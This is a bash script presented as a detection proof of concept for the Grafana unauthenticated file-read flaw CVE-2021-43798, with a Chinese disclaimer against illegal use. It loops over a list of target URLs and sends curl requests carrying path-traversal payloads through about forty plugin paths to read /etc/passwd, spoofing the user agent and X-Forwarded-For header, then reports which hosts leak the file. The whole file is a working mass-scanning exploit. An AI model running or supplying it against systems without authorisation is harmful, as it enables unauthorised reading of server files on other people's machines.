#!/bin/bash
#title="Grafana未授权任意文件读取漏洞检测POC，请勿用于非法测试"

echo -e "
  ______     _______     ____   ___ ____  _       _  _  __________ ___   ___  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ /___  / _ \ ( _ ) 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \  / / (_) |/ _ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) |/ / \__, | (_) |
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____//_/    /_/ \___/ 
_______________________________________________________________________________"

com=`echo $1`

if [ "$com" = "" ];

then

echo "命令格式错误，试例: ./CVE-2021-43798.sh URL.txt";

else

URL=`cat $1`;


POC=`echo -e "/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/candlestick/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stackdriver/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd"`;

for patch in $POC;

do

for HOST in $URL;

do

web=`curl -m 3 -k -s  --path-as-is -A "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" -H "Connection: close" -H "X-Forwarded-For:192.168.0.1" -X GET "$HOST$patch" |grep -w "root"`;

if [[ "$web" =~ "root" ]];

then
echo -e "$HOST$patch \033[31m 存在任意文件读取漏洞 \033[0m";
else
echo -e "$HOST$patch \033[32m 不存在任意文件读取漏洞 \033[0m";

fi

done

done

fi
